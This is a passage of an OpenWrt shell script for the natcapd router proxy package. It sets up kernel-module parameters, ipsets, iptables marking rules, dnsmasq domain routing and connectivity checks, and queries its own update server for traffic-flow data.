#!/bin/sh

TO="timeout"
which timeout >/dev/null 2>&1 && timeout -t1 pwd >/dev/null 2>&1 && TO="timeout -t"

WGET=/usr/bin/wget
test -x $WGET || WGET=/bin/wget
which timeout >/dev/null 2>&1 && WGET="$TO 300 $WGET"

PID=$$
DEV=/dev/natcap_ctl

# mytimeout [Time] [cmd]
mytimeout() {
	local to=$1
	local T=0
	local I=30
	if test $to -le $I; then
		I=$to
	fi
	shift
	if which timeout >/dev/null 2>&1; then
		opt=`timeout -t1 pwd >/dev/null 2>&1 && echo "-t"`
		while test -f $LOCKDIR/$PID; do
			if timeout $opt $I $@ 2>/dev/null; then
				return 0
			else
				T=$((T+I))
				if test $T -ge $to; then
					return 0
				fi
			fi
		done
		return 1
	else
		sh -c "$@"
		return $?
	fi
}

natcapd_trigger()
{
	local path=$1
	local opt

	if which timeout >/dev/null 2>&1; then
		opt=`timeout -t1 pwd >/dev/null 2>&1 && echo "-t"`
		timeout $opt 5 sh -c "echo >$path" 2>/dev/null
	else
		sh -c "echo >$path"
	fi
	return $?
}

natcapd_stop()
{
	echo stop
	echo clean >>$DEV
	#never stop kmod
	echo disabled=0 >>$DEV

	rm /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf 2>/dev/null || \
	rm /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf 2>/dev/null && \
	/etc/init.d/dnsmasq restart

	rm -f /tmp/natcapd.running
	return 0
}

b64encode() {
	cat - | base64 | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' | sed 's/ //g;s/=/_/g'
}

txrx_vals_dump() {
	test -f /tmp/natcapd.txrx || echo "0 0" >/tmp/natcapd.txrx
	cat /tmp/natcapd.txrx | while read tx1 rx1; do
		echo `cat $DEV  | grep flow_total_ | cut -d= -f2` | while read tx2 rx2; do
			tx=$((tx2-tx1))
			rx=$((rx2-rx1))
			if test $tx2 -lt $tx1 || test $rx2 -lt $rx1; then
				tx=$tx2
				rx=$rx2
			fi
			echo $tx $rx
			return 0
		done
	done
}

test -c $DEV || exit 1

natcapd_boot() {
	board_mac_addr=`lua /usr/share/natcapd/board_mac.lua`
	if test -n "$board_mac_addr"; then
		echo default_mac_addr=$board_mac_addr >$DEV
	fi

	client_mac=$board_mac_addr
	test -n "$client_mac" || {
		client_mac=`cat $DEV | grep default_mac_addr | grep -o "[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]"`
		if [ "x$client_mac" = "x00:00:00:00:00:00" ]; then
			client_mac=`uci get natcapd.default.default_mac_addr 2>/dev/null`
			test -n "$client_mac" || client_mac=`cat /sys/class/net/eth0/address | tr a-z A-Z`
			test -n "$client_mac" || client_mac=`cat /sys/class/net/eth1/address | tr a-z A-Z`
			test -n "$client_mac" || client_mac=`head -c6 /dev/urandom | hexdump -e '/1 "%02X:"' | head -c17`
			test -n "$client_mac" || client_mac=`head -c6 /dev/random | hexdump -e '/1 "%02X:"' | head -c17`
			uci set natcapd.default.default_mac_addr="$client_mac"
			uci commit natcapd
			echo default_mac_addr=$client_mac >$DEV
		fi
		eth_mac=`cat /sys/class/net/eth0/address | tr a-z A-Z`
		test -n "$eth_mac" && [ "x$client_mac" != "x$eth_mac" ] && {
			client_mac=$eth_mac
			echo default_mac_addr=$client_mac >$DEV
		}
	}
}

[ x$1 = xboot ] && {
	natcapd_boot
	exit 0
}

enabled="`uci get natcapd.default.enabled 2>/dev/null || echo 0`"
led="`uci get natcapd.default.led 2>/dev/null`"

client_mac=`cat $DEV | grep default_mac_addr | grep -o "[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]:[0-9a-f][0-9a-f]"`
account="`uci get natcapd.default.account 2>/dev/null`"
uhash=`echo -n $client_mac$account | cksum | awk '{print $1}'`
u_hash=`uci get natcapd.default.u_hash 2>/dev/null || echo 0`
[ "x$u_hash" = "x0" ] && u_hash=$uhash
echo u_hash=${u_hash} >>$DEV

u_mask=`uci get natcapd.default.u_mask 2>/dev/null || echo 0`
echo u_mask=${u_mask} >>$DEV

protocol=`uci get natcapd.default.protocol 2>/dev/null || echo 0`
echo protocol=$protocol >>$DEV

# si_mask default 0xff000000
si_mask=`uci get natcapd.default.si_mask 2>/dev/null || echo 4278190080`
echo si_mask=${si_mask} >>$DEV

# ni_mask default 0x00800000
ni_mask=`uci get natcapd.default.ni_mask 2>/dev/null || echo 8388608`
echo ni_mask=${ni_mask} >>$DEV

ACC="$account"
CLI=`echo $client_mac | sed 's/:/-/g' | tr a-z A-Z`
MOD=`cat /etc/board.json | grep model -A2 | grep id\": | sed 's/"/ /g' | awk '{print $3}'`

. /etc/openwrt_release
TAR=`echo $DISTRIB_TARGET | sed 's/\//-/g'`
VER=`echo -n "$DISTRIB_ID-$DISTRIB_RELEASE-$DISTRIB_REVISION-$DISTRIB_CODENAME" | b64encode`

natcapd_get_flows()
{
	local IDX=$1
	local TXRX=`txrx_vals_dump| b64encode`
	URI="/router-update.cgi?cmd=getflows&acc=$ACC&cli=$CLI&idx=$IDX&txrx=$TXRX&mod=$MOD&tar=$TAR"
	$WGET --timeout=180 --ca-certificate=/tmp/cacert.pem -qO- "https://router-sh.ptpt52.com$URI"
}

[ x$1 = xget_flows0 ] && {
	natcapd_get_flows 0 || echo "Get data failed!"
	exit 0
}
[ x$1 = xget_flows1 ] && {
	natcapd_get_flows 1 || echo "Get data failed!"
	exit 0
}

natcap_setup_firewall()
{
	block_dns6="`uci get natcapd.default.block_dns6 2>/dev/null || echo 0`"
	if [ "x$block_dns6" = "x1" -a "x$enabled" = "x1" ]; then
		uci get firewall.natcap_dns1 >/dev/null 2>&1 || {
			uci set firewall.natcap_dns1=rule
			uci set firewall.natcap_dns1.enabled='1'
			uci set firewall.natcap_dns1.name='IPV6 DNS OUTPUT'
			uci set firewall.natcap_dns1.family='ipv6'
			uci set firewall.natcap_dns1.dest_port='53'
			uci set firewall.natcap_dns1.target='DROP'
			uci set firewall.natcap_dns1.dest='wan'
			uci set firewall.natcap_dns2=rule
			uci set firewall.natcap_dns2.enabled='1'
			uci set firewall.natcap_dns2.name='IPV6 DNS FORWARD'
			uci set firewall.natcap_dns2.family='ipv6'
			uci set firewall.natcap_dns2.src='lan'
			uci set firewall.natcap_dns2.dest='wan'
			uci set firewall.natcap_dns2.dest_port='53'
			uci set firewall.natcap_dns2.target='DROP'
			uci commit firewall
			/etc/init.d/firewall reload
		}
	else
		uci delete firewall.natcap_dns1 >/dev/null 2>&1 && {
			uci delete firewall.natcap_dns2 >/dev/null 2>&1
			uci commit firewall
			/etc/init.d/firewall reload
		}
	fi
}

cone_wan_ip()
{
	full_cone_nat="`uci get natcapd.default.full_cone_nat 2>/dev/null || echo 0`"
	if [ "x$full_cone_nat" = "x0" ]; then
		ipset destroy cone_wan_ip >/dev/null 2>&1
	else
		ipset create cone_wan_ip iphash hashsize 32 maxelem 256 >/dev/null 2>&1
		ipset flush cone_wan_ip
		devs=`ip r | grep default | grep -o "dev ".* | awk '{print $2}'`
		for dev in $devs; do
			ips=`ip addr list dev $dev | grep -o inet" ".* | awk '{print $2}' | cut -d/ -f1`
			for ip in $ips; do
				ipset add cone_wan_ip $ip >/dev/null 2>&1
			done
		done
	fi
}

[ x$1 = xcone_wan_ip ] && {
	cone_wan_ip
	exit 0
}

natcap_connected()
{
	ipset list -n cniplist >/dev/null || return 0
	for connected_network_v4 in $(ip route | awk '{print $1}' | egrep '[0-9]{1,3}(\.[0-9]{1,3}){3}'); do
		ipset -! add cniplist $connected_network_v4 >/dev/null 2>&1
	done
}

[ x$1 = xnatcap_connected ] && {
	natcap_connected
	exit 0
}

natcap_setup_firewall
[ x$1 = xstop ] && natcapd_stop && exit 0

[ x$1 = xstart ] || {
	echo "usage: $0 start|stop"
	exit 0
}

add_server () {
	local server=$1
	local opt=$2
	local enc_mode=$3

	if echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)$'; then
		echo server 0 $server:0-$opt-$enc_mode >>$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}$'; then
		echo server 0 $server-$opt-$enc_mode >$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}-[eo]$'; then
		echo server 0 $server-$enc_mode >>$DEV
	elif echo $server | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\):[0-9]\{1,5\}-[eo]-[TU]-[UT]$'; then
		echo server 0 $server >>$DEV
	fi
}
add_gfwlist () {
	ipset -! add gfwlist0 $1
}
add_gfw_udp_port_list () {
	ipset -! add gfw_udp_port_list0 $1
}
add_app_list () {
	ipset -! add app_list0 $1
}
add_knocklist () {
	ipset -! add knocklist $1
}
add_gfwlist_domain () {
	echo server=/$1/8.8.8.8 >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	echo ipset=/$1/gfwlist0 >>/tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
}

_reload_natcapd() {
	NATCAPD_BIN=natcapd-server
	if which $NATCAPD_BIN >/dev/null 2>&1; then
		natcap_redirect_port=`uci get natcapd.default.natcap_redirect_port 2>/dev/null || echo 0`
		sleep 1 && killall $NATCAPD_BIN >/dev/null 2>&1 && sleep 2
		test $natcap_redirect_port -gt 0 && test $natcap_redirect_port -lt 65535 && {
			echo natcap_redirect_port=$natcap_redirect_port >$DEV
			(
			$NATCAPD_BIN -I -l$natcap_redirect_port -t 900 >/dev/null 2>&1
			echo natcap_redirect_port=0 >$DEV
			) &
		}
	fi

	NATCAPD_BIN=natcapd-client
	if which $NATCAPD_BIN >/dev/null 2>&1; then
		natcap_client_redirect_port=`uci get natcapd.default.natcap_client_redirect_port 2>/dev/null || echo 0`
		sleep 1 && killall $NATCAPD_BIN >/dev/null 2>&1 && sleep 2
		test $natcap_client_redirect_port -gt 0 && test $natcap_client_redirect_port -lt 65535 && {
			echo natcap_client_redirect_port=$natcap_client_redirect_port >$DEV
			(
			$NATCAPD_BIN -l$natcap_client_redirect_port -t 900 >/dev/null 2>&1
			echo natcap_client_redirect_port=0 >$DEV
			) &
		}
	fi
}

# maps the 1st parameter so it only uses the bits allowed by the bitmask (2nd parameter)
# which means spreading the bits of the 1st parameter to only use the bits that are set to 1 in the 2nd parameter
# 0 0 0 0 0 1 0 1 (0x05) 1st parameter
# 1 0 1 0 1 0 1 0 (0xAA) 2nd parameter
#     1   0   1          result
natcap_id2mask() {
	local bit_msk bit_val result
	bit_val=0
	result=0
	for bit_msk in $(seq 0 31); do
		if [ $((($2>>bit_msk)&1)) = "1" ]; then
			if [ $((($1>>bit_val)&1)) = "1" ]; then
				result=$((result|(1<<bit_msk)))
			fi
			bit_val=$((bit_val+1))
		fi
	done
	printf "0x%x" $result
}

natcap_target2idx() {
	local idx=1
	(cat $DEV | grep "^server 0 " | while read line; do
		if echo $line | grep -q "server 0 $1$"; then
			echo $idx
			return
		fi
		idx=$((idx+1))
	done
	echo 0) | head -n1
}

_clean_natcap_rules() {
	iptables-save | grep "comment natcap-rule" | sed 's/^-A//' | while read line; do
		iptables -t mangle -D $line
	done
}

_setup_natcap_rules() {
	local si_mask=`uci get natcapd.default.si_mask 2>/dev/null || echo $((0xff000000))`
	if test $si_mask -eq 0; then
		return
	fi
	idx_mask=`printf "0x%x" $si_mask`

	local id=0
	while uci get natcapd.@ruleset[$id].dst >/dev/null 2>&1; do
		local src target idx
		dst=`uci get natcapd.@ruleset[$id].dst`
		src=`uci get natcapd.@ruleset[$id].src`
		target=`uci get natcapd.@ruleset[$id].target`
		echo "$target" | grep -q : || target="$target:65535-e-T-U"
		idx=`natcap_target2idx $target`
		if test $idx -ne 0; then
			ipset -n list $dst >/dev/null 2>&1 || {
				ipset destroy $dst >/dev/null 2>&1
				ipset create $dst hash:net family inet hashsize 1024 maxelem 16384
			}
			idx=`natcap_id2mask $idx $idx_mask`
			if echo $src | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)'; then
				iptables -t mangle -A PREROUTING -m mark --mark 0x0/$idx_mask -m conntrack --ctstate NEW -s $src --match set --match-set $dst dst -m comment --comment "natcap-rule" -j MARK --set-xmark $idx/$idx_mask
			else
				iptables -t mangle -A PREROUTING -m mark --mark 0x0/$idx_mask -m conntrack --ctstate NEW -m mac --mac-source $src --match set --match-set $dst dst -m comment --comment "natcap-rule" -j MARK --set-xmark $idx/$idx_mask
			fi
		fi
		id=$((id+1))
	done

	local id=0
	while uci get natcapd.@rule[$id].src >/dev/null 2>&1; do
		local src target idx
		src=`uci get natcapd.@rule[$id].src`
		target=`uci get natcapd.@rule[$id].target`
		echo "$target" | grep -q : || target="$target:65535-e-T-U"
		idx=`natcap_target2idx $target`
		if test $idx -ne 0; then
			idx=`natcap_id2mask $idx $idx_mask`
			if echo $src | grep -q '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)'; then
				iptables -t mangle -A PREROUTING -m mark --mark 0x0/$idx_mask -m conntrack --ctstate NEW -s $src -m comment --comment "natcap-rule" -j MARK --set-xmark $idx/$idx_mask
			else
				iptables -t mangle -A PREROUTING -m mark --mark 0x0/$idx_mask -m conntrack --ctstate NEW -m mac --mac-source $src -m comment --comment "natcap-rule" -j MARK --set-xmark $idx/$idx_mask
			fi
		fi
		id=$((id+1))
	done
}

get_rate_data()
{
	local cnt num unit
	echo -n $1 | grep -qi "bps$" || {
		num=$1
		echo -n $((num)) # assume num B/s
		return
	}
	cnt=`echo -n $1 | wc -c || echo 0`
	test $cnt -le 4 && echo -n 0 && return # assume 0 B/s

	num=`echo -n $1 | cut -c0-$((cnt-4))`
	unit=`echo -n $1 | cut -c$((cnt-3))-$cnt | tr A-Z a-z`
	case $unit in
		"kbps")
			num=$((num*128))
		;;
		"mbps")
			num=$((num*128*1024))
		;;
		"gbps")
			num=$((num*128*1024*1024))
		;;
		*)
			num=$((num/8))
		;;
	esac
	echo -n $num # assume num bps
}

# reload firewall
uci get firewall.natcapd >/dev/null 2>&1 || {
	uci -q batch <<-EOT
		delete firewall.natcapd
		set firewall.natcapd=include
		set firewall.natcapd.type=script
		set firewall.natcapd.path=/usr/share/natcapd/firewall.include
		set firewall.natcapd.family=any
		set firewall.natcapd.reload=1
		commit firewall
	EOT
	/etc/init.d/firewall reload >/dev/null 2>&1 || echo /etc/init.d/firewall reload failed
}

test -c /dev/natflow_ctl && {
	enable_natflow=`uci get natcapd.default.enable_natflow 2>/dev/null || echo 0`
	if [ "x${enable_natflow}" = "x1" ]; then
		if [ "x`uci get firewall.@defaults[0].flow_offloading 2>/dev/null`" = "x1" ]; then
			uci set firewall.@defaults[0].flow_offloading=0
			uci set firewall.@defaults[0].flow_offloading_hw=0
			uci commit firewall
			/etc/init.d/firewall reload
		fi
	fi
	echo debug=3 >/dev/natflow_ctl
	echo disabled=$((!enable_natflow)) >/dev/natflow_ctl
}

test -c /dev/natcap_peer_ctl && {
	peer_mode=`uci get natcapd.default.peer_mode 2>/dev/null || echo 0`
	peer_max_pmtu=`uci get natcapd.default.peer_max_pmtu 2>/dev/null || echo 1440`
	peer_sni_ban=`uci get natcapd.default.peer_sni_ban 2>/dev/null || echo 0`
	echo peer_mode=${peer_mode} >/dev/natcap_peer_ctl
	echo peer_max_pmtu=${peer_max_pmtu} >/dev/natcap_peer_ctl
	echo peer_sni_ban=${peer_sni_ban} >/dev/natcap_peer_ctl
}

test -c $DEV && {
	natcap_max_pmtu=`uci get natcapd.default.max_pmtu 2>/dev/null || echo 1440`
	echo natcap_max_pmtu=${natcap_max_pmtu} >$DEV
}

ipset -n list wechat_iplist >/dev/null 2>&1 || ipset -! create wechat_iplist iphash hashsize 1024 maxelem 65536

test -n "$led" && echo "$enabled" >>"$led"

if [ "x$enabled" = "x0" ] && test -c $DEV; then
	natcapd_stop
	rm -f /tmp/natcapd_to_cn

	_reload_natcapd
elif test -c $DEV; then
	echo disabled=0 >>$DEV
	touch /tmp/natcapd.running
	debug=`uci get natcapd.default.debug 2>/dev/null || echo 3`
	enable_encryption=`uci get natcapd.default.enable_encryption 2>/dev/null || echo 1`
	clear_dst_on_reload=`uci get natcapd.default.clear_dst_on_reload 2>/dev/null || echo 0`
	server_persist_timeout=`uci get natcapd.default.server_persist_timeout 2>/dev/null || echo 300`
	server_persist_lock=`uci get natcapd.default.server_persist_lock 2>/dev/null || echo 0`
	dns_proxy_drop=`uci get natcapd.default.dns_proxy_drop 2>/dev/null || echo 0`
	peer_multipath=`uci get natcapd.default.peer_multipath 2>/dev/null || echo 0`
	tx_speed_limit=`uci get natcapd.default.tx_speed_limit 2>/dev/null || echo 0`
	rx_speed_limit=`uci get natcapd.default.rx_speed_limit 2>/dev/null || echo 0`
	tx_pkts_threshold=`uci get natcapd.default.tx_pkts_threshold 2>/dev/null || echo 128`
	rx_pkts_threshold=`uci get natcapd.default.rx_pkts_threshold 2>/dev/null || echo 512`
	touch_timeout=`uci get natcapd.default.touch_timeout 2>/dev/null || echo 32`
	servers=`uci get natcapd.default.server 2>/dev/null`
	dns_server=`uci get natcapd.default.dns_server 2>/dev/null`
	knocklist=`uci get natcapd.default.knocklist 2>/dev/null`
	dnsdroplist=`uci get natcapd.default.dnsdroplist 2>/dev/null`
	gfwlist_domain=`uci get natcapd.default.gfwlist_domain 2>/dev/null`
	gfwlist=`uci get natcapd.default.gfwlist 2>/dev/null`
	gfw_udp_port_list=`uci get natcapd.default.gfw_udp_port_list 2>/dev/null`
	app_list=`uci get natcapd.default.app_list 2>/dev/null`
	encode_mode=`uci get natcapd.default.encode_mode 2>/dev/null || echo 0`
	udp_encode_mode=`uci get natcapd.default.udp_encode_mode 2>/dev/null || echo 0`
	sproxy=`uci get natcapd.default.sproxy 2>/dev/null || echo 0`
	access_to_cn=`uci get natcapd.default.access_to_cn 2>/dev/null || echo 0`
	full_proxy=`uci get natcapd.default.full_proxy 2>/dev/null || echo 0`
	[ x$encode_mode = x0 ] && encode_mode=T
	[ x$encode_mode = x1 ] && encode_mode=U
	[ x$udp_encode_mode = x0 ] && udp_encode_mode=U
	[ x$udp_encode_mode = x1 ] && udp_encode_mode=T

	tx_speed_limit=`get_rate_data "$tx_speed_limit"`
	rx_speed_limit=`get_rate_data "$rx_speed_limit"`

	encode_http_only=`uci get natcapd.default.encode_http_only 2>/dev/null || echo 0`
	http_confusion=`uci get natcapd.default.http_confusion 2>/dev/null || echo 0`
	htp_confusion_host=`uci get natcapd.default.htp_confusion_host 2>/dev/null || echo bing.com`
	cnipwhitelist_mode=`uci get natcapd.default.cnipwhitelist_mode 2>/dev/null || echo 0`

	macfilter=`uci get natcapd.default.macfilter 2>/dev/null`
	maclist=`uci get natcapd.default.maclist 2>/dev/null`
	ipfilter=`uci get natcapd.default.ipfilter 2>/dev/null`
	iplist=`uci get natcapd.default.iplist 2>/dev/null`

	cniplist_set=/usr/share/natcapd/cniplist.set
	if [ x$access_to_cn = x1 ]; then
		cnipwhitelist_mode=1
		cniplist_set=/usr/share/natcapd/C_cniplist.set
		rm /tmp/dnsmasq.d/accelerated-domains.gfwlist.dnsmasq.conf 2>/dev/null && \
		/etc/init.d/dnsmasq restart
		rm -f /tmp/natcapd.lck/gfwlist
	fi
	if [ x$full_proxy = x1 ]; then
		cnipwhitelist_mode=1
		cniplist_set=/usr/share/natcapd/local.set
	fi

	if [ x$cnipwhitelist_mode = x2 ]; then
		cniplist_set=/usr/share/natcapd/local.set
	fi

	ipset destroy dnsdroplist >/dev/null 2>&1
	if test -n "$dnsdroplist"; then
		ipset -n list dnsdroplist >/dev/null 2>&1 || ipset -! create dnsdroplist nethash hashsize 64 maxelem 1024
		for d in $dnsdroplist; do
			ipset -! add dnsdroplist $d
		done
	fi

	ipset -n list gfwlist0 >/dev/null 2>&1 || ipset -! create gfwlist0 nethash hashsize 1024 maxelem 65536

	ipset destroy gfw_udp_port_list0 >/dev/null 2>&1
	if test -n "$gfw_udp_port_list"; then
		ipset -n list gfw_udp_port_list0 >/dev/null 2>&1 || ipset -! create gfw_udp_port_list0 bitmap:port range 0-65535
	fi

	ipset destroy app_list0 >/dev/null 2>&1
	if test -n "$app_list"; then
		ipset -n list app_list0 >/dev/null 2>&1 || ipset -! create app_list0 hash:net,port hashsize 1024 maxelem 65536
	fi

	ipset -n list knocklist >/dev/null 2>&1 || ipset -! create knocklist iphash hashsize 64 maxelem 1024
	ipset -n list bypasslist >/dev/null 2>&1 || ipset -! create bypasslist nethash hashsize 1024 maxelem 65536

	ipset destroy cniplist >/dev/null 2>&1
	echo 'create cniplist hash:net family inet hashsize 4096 maxelem 65536' >/tmp/cniplist.set
	(ip route | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)/[0-9]\{1,2\}'; \
	cat $cniplist_set) | sort | uniq | sed 's/^/add cniplist /' >>/tmp/cniplist.set
	ipset restore -f /tmp/cniplist.set
	rm -f /tmp/cniplist.set
	natcap_connected

	echo debug=$debug >>$DEV
	echo clean >>$DEV
	echo server_persist_timeout=$server_persist_timeout >>$DEV
	echo server_persist_lock=$server_persist_lock >>$DEV
	echo dns_proxy_drop=$dns_proxy_drop >>$DEV
	echo peer_multipath=$peer_multipath >>$DEV
	echo tx_speed_limit=$tx_speed_limit >>$DEV
	echo rx_speed_limit=$rx_speed_limit >>$DEV
	echo tx_pkts_threshold=$tx_pkts_threshold >>$DEV
	echo rx_pkts_threshold=$rx_pkts_threshold >>$DEV
	echo natcap_touch_timeout=$touch_timeout >>$DEV
	echo sproxy=$sproxy >$DEV
	test -n "$dns_server" && echo dns_server=$dns_server >$DEV

	echo encode_http_only=$encode_http_only >>$DEV
	echo http_confusion=$http_confusion >>$DEV
	echo htp_confusion_host=$htp_confusion_host >>$DEV
	echo cnipwhitelist_mode=$cnipwhitelist_mode >>$DEV

	test -n "$maclist" && {
		ipset -n list natcap_maclist >/dev/null 2>&1 || ipset -! create natcap_maclist machash hashsize 64 maxelem 1024
		ipset flush natcap_maclist
		for m in $maclist; do
			ipset -! add natcap_maclist $m
		done
	}
	if [ x"$macfilter" == xallow ]; then
		echo macfilter=1 >>$DEV
	elif [ x"$macfilter" == xdeny ]; then
		echo macfilter=2 >>$DEV
	else
		echo macfilter=0 >>$DEV
		ipset destroy natcap_maclist >/dev/null 2>&1
	fi

	test -n "$iplist" && {
		ipset -n list natcap_iplist >/dev/null 2>&1 || ipset -! create natcap_iplist nethash hashsize 64 maxelem 1024
		ipset flush natcap_iplist
		for n in $iplist; do
			ipset -! add natcap_iplist $n
		done
	}
	if [ x"$ipfilter" == xallow ]; then
		echo ipfilter=1 >>$DEV
	elif [ x"$ipfilter" == xdeny ]; then
		echo ipfilter=2 >>$DEV
	else
		echo ipfilter=0 >>$DEV
		ipset destroy natcap_iplist >/dev/null 2>&1
	fi

	opt="o"
	[ "x$enable_encryption" = x1 ] && opt='e'
	for server in $servers; do
		add_server $server $opt $encode_mode-$udp_encode_mode
		g=`echo $server | sed 's/:/ /' | awk '{print $1}'`
		add_knocklist $g
	done

	for server in `cat /tmp/natcapd_extra_servers 2>/dev/null`; do
		add_server $server $opt $encode_mode-$udp_encode_mode
	done

	for k in $knocklist; do
		add_knocklist $k
	done

	for g in $gfwlist; do
		add_gfwlist $g
	done
	for g in $gfw_udp_port_list; do
		add_gfw_udp_port_list $g
	done
	for a in $app_list; do
		add_app_list $a
	done

	rm -f /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	mkdir -p /tmp/dnsmasq.d
	touch /tmp/dnsmasq.d/custom-domains.gfwlist.dnsmasq.conf
	for d in $gfwlist_domain; do
		add_gfwlist_domain $d
	done

	#reload dnsmasq
	if test -p /tmp/trigger_gfwlist_update.fifo; then
		natcapd_trigger '/tmp/trigger_gfwlist_update.fifo'
	fi

	_reload_natcapd

	_clean_natcap_rules
	_setup_natcap_rules
fi

#reload pptpd
test -f /usr/share/natcapd/natcapd.pptpd.sh && sh /usr/share/natcapd/natcapd.pptpd.sh
#reload openvpn
test -f /usr/share/natcapd/natcapd.openvpn.sh && sh /usr/share/natcapd/natcapd.openvpn.sh
#reload cone_nat_unused
test -f /usr/share/natcapd/natcapd.cone_nat_unused.sh && sh /usr/share/natcapd/natcapd.cone_nat_unused.sh init
cone_wan_ip

cd /tmp

_NAME=`basename $0`

LOCKDIR=/tmp/$_NAME.lck

cleanup () {
	if rm -rf $LOCKDIR; then
		echo "Finished"
	else
		echo "Failed to remove lock directory '$LOCKDIR'"
		return 1
	fi
}

nslookup_check () {
	local domain ipaddr
	domain=${1-www.baidu.com}
	ipaddr=`nslookup $domain 2>/dev/null | grep "$domain" -A5 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
	test -n "$ipaddr" || {
		ipaddr=`nslookup $domain 114.114.114.114 2>/dev/null | grep "$domain" -A5 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		test -n "$ipaddr" || {
			ipaddr=`nslookup $domain 8.8.8.8 2>/dev/null | grep "$domain" -A5 | grep Address | grep -o '\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)\.\([0-9]\{1,3\}\)' | head -n1`
		}
	}
	echo "$ipaddr"
}

gfwlist_update_main () {
	test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
	while :; do
		test -f $LOCKDIR/$PID || return 0
		test -p /tmp/trigger_gfwlist_update.fifo || { sleep 1 && continue; }
		mytimeout 86340 'cat /tmp/trigger_gfwlist_update.fifo' >/dev/null && {
			test -f /tmp/natcapd.running && sh /usr/share/natcapd/gfwlist_update.sh
		}
	done
}

natcapd_first_boot() {
	test -e /tmp/xx.tmp.json && return 0
	mkdir /tmp/natcapd.lck/watcher.lck >/dev/null 2>&1 || return 0
	local run=0
	while :; do
		ping -q -W3 -c1 114.114.114.114 >/dev/null 2>&1 || \
			ping -q -W3 -c1 8.8.8.8 >/dev/null 2>&1 || \
			ping -q -W3 -c1 www.baidu.com >/dev/null 2>&1 || \
			ping -q -W3 -c1 -t1 -s1 router-sh.ptpt52.com || {
			# restart ping after 8 secs
			sleep 8
			continue
		}
		[ x$run = x1 ] || {
			run=1
			test -p /tmp/trigger_natcapd_update.fifo && natcapd_trigger '/tmp/trigger_natcapd_update.fifo'
			sleep 5
		}
		test -f /tmp/natcapd.running || break
		test -f /tmp/natcapd.lck/gfwlist && break
		test -p /tmp/trigger_gfwlist_update.fifo && natcapd_trigger '/tmp/trigger_gfwlist_update.fifo'
		sleep 60
	done
	rmdir /tmp/natcapd.lck/watcher.lck
}

txrx_vals() {
	test -f /tmp/natcapd.txrx || echo "0 0" >/tmp/natcapd.txrx
	cat /tmp/natcapd.txrx | while read tx1 rx1; do
		echo `cat $DEV  | grep flow_total_ | cut -d= -f2` | while read tx2 rx2; do
			tx=$((tx2-tx1))
			rx=$((rx2-rx1))
			if test $tx2 -lt $tx1 || test $rx2 -lt $rx1; then
				tx=$tx2
				rx=$rx2
			fi
			echo $tx $rx
			cp /tmp/natcapd.txrx /tmp/natcapd.txrx.old
			echo $tx2 $rx2 >/tmp/natcapd.txrx
			return 0
		done
	done
}

peer_check() {
	PINGH=`uci get natcapd.default.peer_host`
	PINGH=`for hh in $PINGH; do echo $hh; done | head -n1`
	test -n "$PINGH" || PINGH=ec2ns.ptpt52.com

	up1=`ping -W2 -c2 -q www.baidu.com 2>&1 | grep "packets received" | awk '{print $4}'`
	up1=$((up1+0))
	if test $up1 -eq 2; then
		up2=`ping -W5 -c5 -s1 -t1 -q $PINGH 2>&1 | grep "packets received" | awk '{print $4}'`
		up2=$((up2+0))
		if test $up2 -lt 2; then
			# peer offline change mode
			peer_mode=`cat /dev/natcap_peer_ctl  | grep peer_mode= | cut -d= -f2`
			test -n "$peer_mode" && {
				echo peer_mode=$((!peer_mode)) >/dev/natcap_peer_ctl
			}
		fi
	fi
}

ping_cli() {
	local idx=0
	PING="ping"
	which timeout >/dev/null 2>&1 && PING="$TO 30 $PING"
	while :; do
		test -f $LOCKDIR/$PID || return 0
		PINGH=`uci get natcapd.default.peer_host`
		test -n "$PINGH" || PINGH=ec2ns.ptpt52.com
		if [ "$(echo $PINGH | wc -w)" = "1" ]; then
			$PING -t1 -s16 -c16 -W1 -q $PINGH
			sleep 1
		else
			for hh in $PINGH; do
				$PING -t1 -s16 -c16 -W1 -q "$hh" &
			done
			sleep 16
		fi
		idx=$((idx+1))
		# about every 160 secs do peer_check
		PEER_CHECK=`uci get natcapd.default.peer_check 2>/dev/null || echo 0`
		if test $((idx%10)) -eq 0 && [ "x$PEER_CHECK" = "x1"]; then
			peer_check &
		fi
	done
}

main_trigger() {
	local SEQ=0
	local hostip
	local built_in_server
	local crashlog=0
	test -e /sys/kernel/debug/crashlog && crashlog=1
	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
